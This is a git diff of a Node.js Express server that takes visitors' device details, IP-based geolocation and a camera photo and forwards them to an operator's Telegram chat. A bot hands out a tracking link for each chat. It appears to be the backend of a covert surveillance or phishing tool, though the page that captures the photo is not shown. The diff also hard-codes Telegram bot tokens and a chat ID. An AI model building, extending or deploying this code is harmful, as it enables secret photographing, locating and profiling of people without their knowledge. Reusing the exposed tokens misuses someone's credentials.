@@ -1,54 +1,77 @@
 const express = require('express');
 const axios = require('axios');
+const fs = require('fs');
+const path = require('path');
 const FormData = require('form-data');
+const TelegramBot = require('node-telegram-bot-api');
+const { v4: uuidv4 } = require('uuid'); // For generating unique filenames
 
 const app = express();
 const port = 3000;
 
-const TELEGRAM_BOT_TOKEN = '7201017810:AAFMwpK0x_VK0liYn40CWA7o5i9Jxn4j_w4';
-const TELEGRAM_CHAT_ID = '5045459233';
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7201017810:AAFMwpK0x_VK0liYn40CWA7o5i9Jxn4j_w4';
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '5045459233';
 
 app.use(express.json());
 app.use(express.static('public'));
 
-// Function to convert data URI to Blob
-function dataURItoBlob(dataURI) {
-    const byteString = atob(dataURI.split(',')[1]);
-    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-    const ab = new ArrayBuffer(byteString.length);
-    const ia = new Uint8Array(ab);
-    for (let i = 0; i < byteString.length; i++) {
-        ia[i] = byteString.charCodeAt(i);
-    }
-    return new Blob([ab], { type: mimeString });
+// Convert data URI to Buffer
+function dataURItoBuffer(dataURI) {
+    const base64Data = dataURI.split(',')[1];
+    return Buffer.from(base64Data, 'base64');
 }
 
-// Function to send photo and user agent details to Telegram
-function sendPhotoAndUserAgentToTelegram(dataURL, userAgent, chatId) {
-    const blob = dataURItoBlob(dataURL);
-    const formData = new FormData();
-    formData.append('photo', blob, 'photo.png');
-    formData.append('text', `User Agent: ${userAgent}`);
-    formData.append('chat_id', chatId);
-
-    axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, formData, {
-        headers: {
-            ...formData.getHeaders()
-        }
-    })
-    .then(response => {
-        if (response.status === 200) {
-            console.log('Photo and user agent details sent to Telegram successfully');
-        } else {
-            throw new Error('Failed to send photo and user agent details to Telegram');
-        }
-    })
-    .catch(error => {
-        console.error('Error sending photo and user agent details to Telegram:', error);
+// Save image buffer to file
+function saveImageBuffer(buffer, filePath) {
+    return new Promise((resolve, reject) => {
+        fs.writeFile(filePath, buffer, err => {
+            if (err) return reject(err);
+            resolve();
+        });
     });
 }
 
-// Routes
+// Send photo with caption to Telegram
+async function sendPhotoToTelegram(dataURL, userAgent) {
+    const buffer = dataURItoBuffer(dataURL);
+    const uniqueFileName = `photo_${uuidv4()}.png`;
+    const filePath = path.join(__dirname, 'images', uniqueFileName);
+
+    try {
+        // Ensure the images directory exists
+        if (!fs.existsSync(path.dirname(filePath))) {
+            fs.mkdirSync(path.dirname(filePath), { recursive: true });
+        }
+
+        // Save image
+        await saveImageBuffer(buffer, filePath);
+
+        // Prepare form data for Telegram
+        const formData = new FormData();
+        formData.append('photo', fs.createReadStream(filePath));
+        formData.append('caption', `User Agent: ${userAgent}`);
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+
+        // Send photo to Telegram
+        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, formData, {
+            headers: { ...formData.getHeaders() }
+        });
+
+        if (response.status === 200) {
+            console.log('Photo sent to Telegram successfully');
+        } else {
+            throw new Error(`Failed to send photo to Telegram: ${response.statusText}`);
+        }
+
+        // Clean up the saved image
+        fs.unlink(filePath, err => {
+            if (err) console.error('Error deleting file:', err);
+        });
+
+    } catch (error) {
+        console.error('Error sending photo to Telegram:', error);
+    }
+}
 
 // Get public IP and geolocation
 app.get('/ip', async (req, res) => {
@@ -67,7 +90,7 @@ app.get('/ip', async (req, res) => {
 });
 
 // Receive device information
-app.post('/device-info', (req, res) => {
+app.post('/device-info', async (req, res) => {
     const deviceInfo = req.body;
     console.log('Device Info:', deviceInfo);
 
@@ -80,25 +103,24 @@ Device Information:
 - User Agent: ${deviceInfo.userAgent}
     `;
 
-    sendMessageToTelegram(message);
-    res.send('Device info received');
-});
+    try {
+        // Send device information message to Telegram
+        await sendMessageToTelegram(message);
 
-// Endpoint to trigger capturing photo and sending to Telegram
-app.get('/capture-photo', (req, res) => {
-    const chatId = req.query.chatId;
-    if (chatId) {
-        sendPhotoAndUserAgentToTelegram('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA...', 'Mozilla/5.0', chatId); // Replace with actual dataURL and userAgent
-        res.send('Photo capture initiated');
-    } else {
-        res.status(400).send('Chat ID is required');
+        // Send the photo
+        await sendPhotoToTelegram(deviceInfo.photo, deviceInfo.userAgent);
+
+        res.send('Device info received');
+    } catch (error) {
+        console.error('Error processing device info:', error);
+        res.status(500).send('Error processing device info');
     }
 });
 
 // Function to send message to Telegram
 function sendMessageToTelegram(message) {
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    axios.post(url, {
+    return axios.post(url, {
         chat_id: TELEGRAM_CHAT_ID,
         text: message
     })
@@ -118,17 +140,12 @@ function sendMessageToTelegram(message) {
 app.listen(port, () => {
     console.log(`Server running at http://localhost:${port}`);
 });
-const TelegramBot = require('node-telegram-bot-api');
-
-// Replace with your actual bot token
-const token = '6663057274:AAHV-Wf7WVdcHZdTLo9TfOtvRVKSdMH6vuw';
 
 // Create a bot instance
-const bot = new TelegramBot(token, { polling: true });
+const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
 
 // Handle /start command
 bot.onText(/\/start/, (msg) => {
-  const chatId = msg.chat.id;
-  bot.sendMessage(chatId, 'HEY ,YOUR LINK IS:-https://telegram-bot-1-oard.onrender.com');
+    const chatId = msg.chat.id;
+    bot.sendMessage(chatId, 'HEY, YOUR LINK IS:- https://your-server-url/capture-photo?chatId=' + chatId);
 });
-
